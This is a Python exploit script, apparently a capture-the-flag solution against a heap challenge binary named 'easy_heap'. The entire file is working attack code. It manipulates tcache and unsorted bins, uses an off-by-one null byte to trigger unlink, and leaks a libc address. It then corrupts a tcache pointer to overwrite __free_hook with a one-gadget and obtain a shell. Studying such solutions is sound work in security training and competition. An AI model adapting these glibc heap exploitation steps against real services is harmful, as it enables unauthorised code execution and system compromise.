#!/usr/bin/env python
# coding:utf-8
# Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR

from ctf import *


binary = './easy_heap'
context.terminal = ['tmux', 'splitw', '-h']
mode = args['MODE'].lower()

code = context.binary = ELF(binary)
if args['LIBDEBUG']:
    os.environ['LD_LIBRARY_PATH'] = '/dbg{}/lib'.format(code.bits)
if args['LIBC']:
    os.environ['LD_PRELOAD'] = os.path.abspath(args['LIBC'])
libc = code.libc

MAIN_ARENA = 0x3ebc40
ONE_GADGET = 0x4f322


def exploit():
    if mode == 'remote':
        io = remote('0', 4000)
        context.noptrace = True
    elif mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
    else:
        io = process(binary)

    def do_malloc(data=None, size=None):
        io.sendlineafter('>', 1)
        if data is None:
            data = cyclic(size - 1)
        if size is None:
            size = len(data) + 1
        if len(data) < size:
            data += '\n'
        io.sendlineafter('>', size)
        io.sendafter('>', data)

    def do_free(idx):
        io.sendlineafter('>', 2)
        io.sendlineafter('>', idx)

    def do_puts(idx):
        io.sendlineafter('>', 3)
        io.sendlineafter('> ', idx)

    for i in xrange(10):
        do_malloc(size=8)

    # fill tcache
    do_free(1)
    do_free(3)
    for i in xrange(5, 10):
        do_free(i)

    # construct unsorted bin list
    do_free(0)
    do_free(2)
    do_free(4)

    # clear tcache
    for i in xrange(7):
        do_malloc(size=8)

    # mov unsorted bins into tcache
    do_malloc('', size=0)
    # 1. create an unlinkable chunk
    # 2. mark the chunk as free by off by one null byte
    do_malloc('', size=0xf8)

    # fill tcache
    for i in xrange(5):
        do_free(i)
    do_free(6)

    # trigger unlink to eat previous unlinkable chunk
    do_free(5)
    do_free(7)

    # leak libc
    do_puts(8)
    libc.address = unpack(io.recvline(keepends=False), 'all') - MAIN_ARENA - 0x60
    info('libc address: %#x', libc.address)

    # clear tcache
    for i in xrange(7):
        do_malloc(size=8)

    # corrupt FD of tcache
    do_malloc(size=8)
    do_free(7)
    do_free(8)

    # overwrite free hook to one gadget
    info('free hook: %#x', libc.symbols['__free_hook'])
    do_malloc(pack(libc.symbols['__free_hook'], 'all'))
    do_malloc('/bin/sh')
    do_malloc(pack(libc.address + ONE_GADGET, 'all'))

    # trigger
    do_free(8)

    io.gdb.attach(gdbscript='''
    ''')

    if mode == 'debug':
        # codebase = io.gdb.get_base('code')
        codebase = 0x555555554000
        io.gdb.execute('''
            parseheap
            x/20xg *(long *){:#x}
            bins
        '''.format(codebase + 0x202050).strip())


    io.interactive()


if __name__ == '__main__':
    exploit()
